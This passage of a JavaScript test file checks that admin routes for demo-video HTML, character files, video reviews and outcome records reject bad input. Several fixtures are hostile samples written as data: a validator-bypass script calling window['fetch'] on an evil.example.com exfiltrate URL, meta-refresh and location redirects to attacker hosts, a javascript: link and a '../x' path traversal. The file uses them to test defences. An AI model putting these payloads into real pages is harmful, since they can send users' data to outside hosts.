  const adminHttp = makeFakeAdminHttp();
  registerAdminRoute(adminHttp);
  const { status, body } = await adminHttp.call('POST', '/admin/project-home/demo-video/write', { body: { cwd, html } });
  expect(status).toBe(400);
  expect(body.ok).toBe(false);
  expect(fs.existsSync(path.join(cwd, 'session-manager-operations', 'project-pages', 'demo-video'))).toBe(false);
});

test('rejects a 30 s demo-video html over 2MB', async () => {
  const cwd = await mkProjectCwd();
  const adminHttp = makeFakeAdminHttp();
  registerAdminRoute(adminHttp);
  const html = durHtml(30).replace('x</body>', `<!--${'a'.repeat(MAX_DEMO_VIDEO_BYTES)}--></body>`);
  const { status, body } = await adminHttp.call('POST', '/admin/project-home/demo-video/write', { body: { cwd, html } });
  expect(status).toBe(400);
  expect(body.error).toContain('limit');
});

test('demo-video route: relative cwd is a 400', async () => {
  const adminHttp = makeFakeAdminHttp();
  registerAdminRoute(adminHttp);
  const res = await adminHttp.call('POST', '/admin/project-home/demo-video/write', { body: { cwd: 'relative/dir', html: GOOD_DEMO_VIDEO_HTML } });
  expect(res.status).toBe(400);
});

test('validateDemoVideoHtml accepts GOOD_DEMO_VIDEO_HTML and exact-boundary durations 5, 30 and 60', () => {
  expect(validateDemoVideoHtml(GOOD_DEMO_VIDEO_HTML)).toBeNull();
  expect(validateDemoVideoHtml('<html><head><meta name="sm-demo-duration" content="5"></head><body>x</body></html>')).toBeNull();
  expect(validateDemoVideoHtml('<html><head><meta name="sm-demo-duration" content="30"></head><body>x</body></html>')).toBeNull();
  expect(validateDemoVideoHtml('<html><head><meta name="sm-demo-duration" content="60"></head><body>x</body></html>')).toBeNull();
});

test('validateDemoVideoHtml accepts a legitimate requestAnimationFrame/canvas demo', () => {
  const html = '<!DOCTYPE html><html><head><meta name="sm-demo-duration" content="12"></head>'
    + '<body><canvas id="c" width="200" height="100"></canvas><script>'
    + 'const ctx = document.getElementById("c").getContext("2d");'
    + 'let x = 0;'
    + 'const draw = () => { ctx.clearRect(0,0,200,100); ctx.fillRect(x,0,10,10); x = (x+1)%200; requestAnimationFrame(draw); };'
    + 'requestAnimationFrame(draw);'
    + '</script></body></html>';
  expect(validateDemoVideoHtml(html)).toBeNull();
});

test("validateDemoVideoHtml rejects the validator's demonstrated bypass: comment-decoy <head> + computed window[\"fetch\"]", () => {
  const exploit = '<!DOCTYPE html><html>'
    + '<!-- decoy: <head> this is not a real head tag, just a comment -->'
    + '<body><meta name="sm-demo-duration" content="10">'
    + '<script>window["fetch"]("https://evil.example.com/exfiltrate")</script>'
    + '</body></html>';
  const rejection = validateDemoVideoHtml(exploit);
  expect(rejection).not.toBeNull();
  expect(rejection).toMatch(/network-capable/);
});

test('validateDemoVideoHtml rejects meta refresh navigation', () => {
  const html = '<!DOCTYPE html><html><head><meta name="sm-demo-duration" content="10">'
    + '<meta http-equiv="refresh" content="0;url=https://attacker/exfiltrate"></head>'
    + '<body>x</body></html>';
  const rejection = validateDemoVideoHtml(html);
  expect(rejection).not.toBeNull();
  expect(rejection).toMatch(/network-capable/);
});

test('validateDemoVideoHtml rejects location.href/assign/replace navigation', () => {
  const base = '<!DOCTYPE html><html><head><meta name="sm-demo-duration" content="10"></head><body><script>';
  const tail = '</script></body></html>';
  expect(validateDemoVideoHtml(`${base}location.href = "https://attacker.example"${tail}`)).toMatch(/network-capable/);
  expect(validateDemoVideoHtml(`${base}location.assign("https://attacker.example")${tail}`)).toMatch(/network-capable/);
  expect(validateDemoVideoHtml(`${base}location.replace("https://attacker.example")${tail}`)).toMatch(/network-capable/);
  expect(validateDemoVideoHtml(`${base}location = "https://attacker.example"${tail}`)).toMatch(/network-capable/);
});

test('validateDemoVideoHtml does not reject "allocation" or a strict equality check on location', () => {
  const html = '<!DOCTYPE html><html><head><meta name="sm-demo-duration" content="10"></head>'
    + '<body><canvas id="c"></canvas><script>'
    + 'const allocation = 1; if (allocation === 1 && typeof location === "object") { console.log(allocation); }'
    + '</script></body></html>';
  expect(validateDemoVideoHtml(html)).toBeNull();
});

test('validateDemoVideoHtml rejects document.location', () => {
  const html = '<!DOCTYPE html><html><head><meta name="sm-demo-duration" content="10"></head>'
    + '<body><script>document.location = "https://attacker.example"</script></body></html>';
  const rejection = validateDemoVideoHtml(html);
  expect(rejection).not.toBeNull();
  expect(rejection).toMatch(/network-capable/);
});

test('validateDemoVideoHtml rejects top./parent. property access', () => {
  const topHtml = '<!DOCTYPE html><html><head><meta name="sm-demo-duration" content="10"></head>'
    + '<body><script>top.location = "https://attacker.example"</script></body></html>';
  expect(validateDemoVideoHtml(topHtml)).toMatch(/network-capable/);
  const parentHtml = '<!DOCTYPE html><html><head><meta name="sm-demo-duration" content="10"></head>'
    + '<body><script>parent.location = "https://attacker.example"</script></body></html>';
  expect(validateDemoVideoHtml(parentHtml)).toMatch(/network-capable/);
});

test('validateDemoVideoHtml rejects anchor tags with http(s)/protocol-relative/javascript hrefs', () => {
  const base = '<!DOCTYPE html><html><head><meta name="sm-demo-duration" content="10"></head><body>';
  const tail = '</body></html>';
  expect(validateDemoVideoHtml(`${base}<a href="https://attacker.example">go</a>${tail}`)).toMatch(/network-capable/);
  expect(validateDemoVideoHtml(`${base}<a href="//attacker.example">go</a>${tail}`)).toMatch(/network-capable/);
  expect(validateDemoVideoHtml(`${base}<a href="javascript:alert(1)">go</a>${tail}`)).toMatch(/network-capable/);
});

test('injectCsp places the CSP meta immediately after the doctype even with a comment-decoy <head>', () => {
  const decoy = '<!DOCTYPE html><html>'
    + '<!-- decoy: <head> this is not a real head tag, just a comment -->'
    + '<body><p>hello</p></body></html>';
  const result = injectCsp(decoy);
  expect(result.startsWith(`<!DOCTYPE html>${DEMO_VIDEO_CSP}`)).toBe(true);
});

const GOOD_CHARACTER = {
  json: { name: 'Bit', palette: ['#fff', '#000'], voice: { engine: 'kokoro', id: 'af_heart' } },
  js: 'window.character={mount(){},pose(){},mouth(){}};',
};

test('character/write: first write, refusal without replace, replace overwrites', async () => {
  const cwd = await mkProjectCwd();
  const adminHttp = makeFakeAdminHttp();
  registerAdminRoute(adminHttp);
  const url = '/admin/project-home/character/write';
  const dir = path.join(pagesRoot(cwd), 'videos', '_character');

  const first = await adminHttp.call('POST', url, { body: { cwd, ...GOOD_CHARACTER } });
  expect(first.status).toBe(200);
  expect(fs.readFileSync(path.join(dir, 'character.js'), 'utf8')).toBe(GOOD_CHARACTER.js);
  expect(JSON.parse(fs.readFileSync(path.join(dir, 'character.json'), 'utf8')).name).toBe('Bit');

  const again = await adminHttp.call('POST', url, { body: { cwd, ...GOOD_CHARACTER, json: { ...GOOD_CHARACTER.json, name: 'Two' } } });
  expect(again.status).toBe(409);
  expect(JSON.parse(fs.readFileSync(path.join(dir, 'character.json'), 'utf8')).name).toBe('Bit');

  const replaced = await adminHttp.call('POST', url, { body: { cwd, ...GOOD_CHARACTER, json: { ...GOOD_CHARACTER.json, name: 'Two' }, replace: true } });
  expect(replaced.status).toBe(200);
  expect(JSON.parse(fs.readFileSync(path.join(dir, 'character.json'), 'utf8')).name).toBe('Two');
});

test('character/write: rejects network js, oversized js and bad json', async () => {
  const cwd = await mkProjectCwd();
  const adminHttp = makeFakeAdminHttp();
  registerAdminRoute(adminHttp);
  const url = '/admin/project-home/character/write';
  const net = await adminHttp.call('POST', url, { body: { cwd, ...GOOD_CHARACTER, js: 'fetch("x")' } });
  expect(net.status).toBe(400);
  const big = await adminHttp.call('POST', url, { body: { cwd, ...GOOD_CHARACTER, js: 'a'.repeat(300 * 1024 + 1) } });
  expect(big.status).toBe(400);
  const bad = await adminHttp.call('POST', url, { body: { cwd, ...GOOD_CHARACTER, json: { name: 'x' } } });
  expect(bad.status).toBe(400);
});

const { MAX_JSON_BYTES: MAX_CHARACTER_JSON_BYTES } = require('../lib/demo-video-kit/character.cjs');
const CHARACTER_URL = '/admin/project-home/character/write';
const CAST_COMMAND = ['speak-tool', '--text', '{text}', '--out', '{out}'];
const GOOD_CAST = [
  { name: 'Guide', voice: { engine: 'command', command: CAST_COMMAND } },
  { name: 'Helper', voice: { engine: 'kokoro', id: 'am_adam' } },
  { name: 'Mascot', note: 'Appears on screen and never speaks.' },
];

function characterDirOf(cwd) {
  return path.join(pagesRoot(cwd), 'videos', '_character');
}

async function characterSetup() {
  const cwd = await mkProjectCwd();
  const adminHttp = makeFakeAdminHttp();
  registerAdminRoute(adminHttp);
  return { cwd, adminHttp, dir: characterDirOf(cwd) };
}

test('character/write: a valid cast (command, kokoro and voiceless members) is saved', async () => {
  const { cwd, adminHttp, dir } = await characterSetup();
  const json = { ...GOOD_CHARACTER.json, cast: GOOD_CAST };
  const r = await adminHttp.call('POST', CHARACTER_URL, { body: { cwd, ...GOOD_CHARACTER, json } });
  expect(r.status).toBe(200);
  const saved = JSON.parse(fs.readFileSync(path.join(dir, 'character.json'), 'utf8'));
  expect(saved.cast).toEqual(GOOD_CAST);
});

test('character/write: an invalid cast is refused with the named reason and nothing is written', async () => {
  const { cwd, adminHttp, dir } = await characterSetup();
  const cases = [
    [[{ name: 'Guide' }, { name: 'guide' }], /duplicates cast\[0\]\.name/],
    [[{ name: 'bit' }], /is the host's name/],
    [[{ name: 'Guide', voice: { engine: 'robot' } }], /cast\[0\]\.voice\.engine must be 'kokoro' or 'command'/],
    [[{ name: 'Guide', voice: { engine: 'command', command: ['speak-tool', '{out}'] } }], /\{text\} placeholder/],
    [[{ name: 'Guide', voice: { engine: 'command', command: ['speak-tool', '{text}'] } }], /\{out\} placeholder/],
    [Array.from({ length: 9 }, (_, i) => ({ name: `Member ${i}` })), /at most 8 members/],
  ];
  for (const [cast, reason] of cases) {
    const r = await adminHttp.call('POST', CHARACTER_URL, { body: { cwd, ...GOOD_CHARACTER, json: { ...GOOD_CHARACTER.json, cast } } });
    expect(r.status).toBe(400);
    expect(r.body.error.startsWith('character.json invalid:')).toBe(true);
    expect(r.body.error).toMatch(reason);
  }
  expect(fs.existsSync(path.join(dir, 'character.json'))).toBe(false);
  expect(fs.existsSync(path.join(dir, 'character.js'))).toBe(false);
});

test('character/write: a character.json over MAX_JSON_BYTES as saved is refused and nothing is written', async () => {
  const { cwd, adminHttp, dir } = await characterSetup();
  const palette = Array.from({ length: 2000 }, (_, i) => `#${String(i).padStart(6, '0')}`);
  const json = { ...GOOD_CHARACTER.json, palette };
  const saved = JSON.stringify(json, null, 2) + '\n';
  expect(Buffer.byteLength(saved)).toBeGreaterThan(MAX_CHARACTER_JSON_BYTES);
  const r = await adminHttp.call('POST', CHARACTER_URL, { body: { cwd, ...GOOD_CHARACTER, json } });
  expect(r.status).toBe(400);
  expect(r.body.error).toContain(`${MAX_CHARACTER_JSON_BYTES}-byte limit`);
  expect(r.body.error).toContain(`${Buffer.byteLength(saved)} bytes as saved`);
  expect(fs.existsSync(path.join(dir, 'character.json'))).toBe(false);
  expect(fs.existsSync(path.join(dir, 'character.js'))).toBe(false);
});

test('character/write: an unusable existing character is refused without replace and overwritten with it', async () => {
  const fresh = { ...GOOD_CHARACTER, json: { ...GOOD_CHARACTER.json, name: 'Fresh' } };

  // character.json exists but fails validation
  {
    const { cwd, adminHttp, dir } = await characterSetup();
    fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(path.join(dir, 'character.json'), JSON.stringify({ name: 'Old' }));
    fs.writeFileSync(path.join(dir, 'character.js'), GOOD_CHARACTER.js);
    const r = await adminHttp.call('POST', CHARACTER_URL, { body: { cwd, ...fresh } });
    expect(r.status).toBe(409);
    expect(r.body.error).toMatch(/^a character already exists but cannot be used \(character\.json invalid: palette must be/);
    expect(r.body.error).toContain('pass replace: true to overwrite it');
    expect(JSON.parse(fs.readFileSync(path.join(dir, 'character.json'), 'utf8')).name).toBe('Old');
    const ok = await adminHttp.call('POST', CHARACTER_URL, { body: { cwd, ...fresh, js: 'window.character={};', replace: true } });
    expect(ok.status).toBe(200);
    expect(JSON.parse(fs.readFileSync(path.join(dir, 'character.json'), 'utf8')).name).toBe('Fresh');
    expect(fs.readFileSync(path.join(dir, 'character.js'), 'utf8')).toBe('window.character={};');
  }

  // only character.js exists
  {
    const { cwd, adminHttp, dir } = await characterSetup();
    fs.mkdirSync(dir, { recursive: true });
    fs.writeFileSync(path.join(dir, 'character.js'), 'old();');
    const r = await adminHttp.call('POST', CHARACTER_URL, { body: { cwd, ...fresh } });
    expect(r.status).toBe(409);
    expect(r.body.error).toMatch(/^a character already exists but cannot be used \(character\.json is missing in /);
    expect(fs.readFileSync(path.join(dir, 'character.js'), 'utf8')).toBe('old();');
    expect(fs.existsSync(path.join(dir, 'character.json'))).toBe(false);
  }

  // a valid existing character keeps the unchanged message
  {
    const { cwd, adminHttp } = await characterSetup();
    expect((await adminHttp.call('POST', CHARACTER_URL, { body: { cwd, ...GOOD_CHARACTER } })).status).toBe(200);
    const r = await adminHttp.call('POST', CHARACTER_URL, { body: { cwd, ...fresh } });
    expect(r.status).toBe(409);
    expect(r.body.error).toBe('a character already exists — pass replace: true to overwrite it');
  }
});

// ── POST /admin/project-home/videos/review/write ─────────────────────────────
const videoReview = require('../lib/project-pages/videoReview.cjs');
const { REVIEW_WRITE_BODY_MAX } = require('../lib/feedback-remote/projectHomeAdminRoutes.cjs');

const REVIEW_URL = '/admin/project-home/videos/review/write';
const PNG_B64 = Buffer.concat([Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]), Buffer.alloc(16)]).toString('base64');

async function reviewSetup({ dispatch = true } = {}) {
  const cwd = await mkProjectCwd();
  const adminHttp = makeFakeAdminHttp();
  registerAdminRoute(adminHttp);
  const videoId = 'ep-1';
  if (dispatch) {
    const r = await videoReview.recordDispatch(cwd, videoId, { macroId: 'burrow-episode', stage: 'storyboard' });
    expect(r.ok).toBe(true);
  }
  return { cwd, adminHttp, videoId };
}

test('videos/review/write: saves material after a recorded dispatch', async () => {
  const { cwd, adminHttp, videoId } = await reviewSetup();
  const { status, body } = await adminHttp.call('POST', REVIEW_URL, {
    body: { cwd, videoId, text: 'Episode script', images: [{ base64: PNG_B64 }, { base64: PNG_B64 }] },
  });
  expect(status).toBe(200);
  expect(body).toEqual({ ok: true, entryId: videoId, status: 'waiting' });
  const review = await videoReview.readReview(cwd, videoId);
  expect(review.material.text).toBe('Episode script');
  expect(review.material.images.map((i) => i.name)).toEqual(['image-1.png', 'image-2.png']);
  expect(review.decision).toBeNull();
});

test('videos/review/write: a 32000-char text is saved, a 32001-char text is refused', async () => {
  const { cwd, adminHttp, videoId } = await reviewSetup();
  expect(videoReview.REVIEW_TEXT_MAX).toBe(32000);
  const ok = await adminHttp.call('POST', REVIEW_URL, { body: { cwd, videoId, text: 'a'.repeat(32000), images: [{ base64: PNG_B64 }] } });
  expect(ok.status).toBe(200);
  expect(ok.body.ok).toBe(true);
  const tooLong = await adminHttp.call('POST', REVIEW_URL, { body: { cwd, videoId, text: 'a'.repeat(32001), images: [{ base64: PNG_B64 }] } });
  expect(tooLong.status).toBe(400);
  expect(tooLong.body.ok).toBe(false);
  expect((await videoReview.readReview(cwd, videoId)).material.text).toBe('a'.repeat(32000));
});

test.each(['decision', 'status', 'approved', 'approvedAt'])('videos/review/write: a body with %s is refused', async (key) => {
  const { cwd, adminHttp, videoId } = await reviewSetup();
  const { status, body } = await adminHttp.call('POST', REVIEW_URL, {
    body: { cwd, videoId, text: 'x', images: [{ base64: PNG_B64 }], [key]: key === 'approved' ? true : 'approve' },
  });
  expect(status).toBe(400);
  expect(body).toEqual({ ok: false, error: 'review decisions are made only by a human in the app' });
  expect((await videoReview.readReview(cwd, videoId)).material).toBeNull();
});

test('videos/review/write: refused without a recorded dispatch', async () => {
  const { cwd, adminHttp, videoId } = await reviewSetup({ dispatch: false });
  const { status, body } = await adminHttp.call('POST', REVIEW_URL, { body: { cwd, videoId, text: 'x', images: [{ base64: PNG_B64 }] } });
  expect(status).toBe(400);
  expect(body.ok).toBe(false);
  expect(body.error).toContain('no dispatch');
});

test('videos/review/write: rejects bad images, a missing cwd and an oversized body', async () => {
  const { cwd, adminHttp, videoId } = await reviewSetup();
  const notImage = await adminHttp.call('POST', REVIEW_URL, { body: { cwd, videoId, text: 'x', images: [{ base64: Buffer.from('hello').toString('base64') }] } });
  expect(notImage.status).toBe(400);
  const noImages = await adminHttp.call('POST', REVIEW_URL, { body: { cwd, videoId, text: 'x', images: [] } });
  expect(noImages.status).toBe(400);
  const badShape = await adminHttp.call('POST', REVIEW_URL, { body: { cwd, videoId, text: 'x', images: ['abc'] } });
  expect(badShape.status).toBe(400);
  const noCwd = await adminHttp.call('POST', REVIEW_URL, { body: { videoId, text: 'x', images: [{ base64: PNG_B64 }] } });
  expect(noCwd.status).toBe(400);
  expect(REVIEW_WRITE_BODY_MAX).toBe(18 * 1024 * 1024);
  const big = await adminHttp.call('POST', REVIEW_URL, { rawBody: `{"cwd":"${cwd}","pad":"${'a'.repeat(REVIEW_WRITE_BODY_MAX)}"}` });
  expect(big.status).toBe(413);
  expect(big.body.ok).toBe(false);
});

// ── POST /admin/project-home/videos/outcome/write ────────────────────────────
const OUTCOME_URL = '/admin/project-home/videos/outcome/write';
const outcomePath = (cwd, videoId) => path.join(pagesRoot(cwd), 'videos', videoId, 'outcome.json');

async function outcomeSetup() {
  const cwd = await mkProjectCwd();
  const adminHttp = makeFakeAdminHttp();
  registerAdminRoute(adminHttp);
  return { cwd, adminHttp };
}

test('videos/outcome/write: saves {id, outcome, text, at} for the entry', async () => {
  const { cwd, adminHttp } = await outcomeSetup();
  const text = 'The series is complete: all 12 episodes are out.';
  const { status, body } = await adminHttp.call('POST', OUTCOME_URL, {
    body: { cwd, videoId: 'ep-13', outcome: 'season-complete', text },
  });
  expect(status).toBe(200);
  expect(body.ok).toBe(true);
  expect(body.entryId).toBe('ep-13');
  expect(body.path).toBe(outcomePath(cwd, 'ep-13'));
  const saved = JSON.parse(fs.readFileSync(outcomePath(cwd, 'ep-13'), 'utf8'));
  expect(Object.keys(saved).sort()).toEqual(['at', 'id', 'outcome', 'text']);
  expect(saved).toMatchObject({ id: 'ep-13', outcome: 'season-complete', text });
  expect(Number.isNaN(Date.parse(saved.at))).toBe(false);
  // a 300-char text is accepted
  const max = await adminHttp.call('POST', OUTCOME_URL, { body: { cwd, videoId: 'ep-14', outcome: 'season-complete', text: 'a'.repeat(300) } });
  expect(max.status).toBe(200);
});

test.each([
  ['an invalid videoId', { videoId: '../x' }, 'videoId'],
  ['a missing videoId', { videoId: undefined }, 'videoId'],
  ['another outcome', { outcome: 'failed' }, 'season-complete'],
  ['an empty text', { text: '' }, 'text'],
  ['a whitespace-only text', { text: '   ' }, 'text'],
  ['a multi-line text', { text: 'line one\nline two' }, 'one line'],
  ['a text over 300 chars', { text: 'a'.repeat(301) }, '300'],
  ['an unknown key', { status: 'done' }, 'status'],
])('videos/outcome/write: refuses %s with 400 and a reason', async (_label, patch, reason) => {
  const { cwd, adminHttp } = await outcomeSetup();
  const body = { cwd, videoId: 'ep-13', outcome: 'season-complete', text: 'Series finished.', ...patch };
  const r = await adminHttp.call('POST', OUTCOME_URL, { body });
  expect(r.status).toBe(400);
  expect(r.body.ok).toBe(false);
  expect(r.body.error).toContain(reason);
  expect(fs.existsSync(path.join(pagesRoot(cwd), 'videos'))).toBe(false);
});

test('videos/outcome/write: refuses an entry whose index.html already exists', async () => {
  const { cwd, adminHttp } = await outcomeSetup();
  const dir = path.join(pagesRoot(cwd), 'videos', 'ep-1');
  fs.mkdirSync(dir, { recursive: true });
  fs.writeFileSync(path.join(dir, 'index.html'), '<html></html>');
  const r = await adminHttp.call('POST', OUTCOME_URL, { body: { cwd, videoId: 'ep-1', outcome: 'season-complete', text: 'Done.' } });
  expect(r.status).toBe(400);
  expect(r.body.error).toContain('already has a video');
  expect(fs.existsSync(path.join(dir, 'outcome.json'))).toBe(false);
});

test('videos/outcome/write: refuses a missing cwd and invalid JSON', async () => {
  const { adminHttp } = await outcomeSetup();
  const noCwd = await adminHttp.call('POST', OUTCOME_URL, { body: { videoId: 'ep-1', outcome: 'season-complete', text: 'Done.' } });
  expect(noCwd.status).toBe(400);
  const badJson = await adminHttp.call('POST', OUTCOME_URL, { rawBody: '{nope' });
  expect(badJson.status).toBe(400);
});
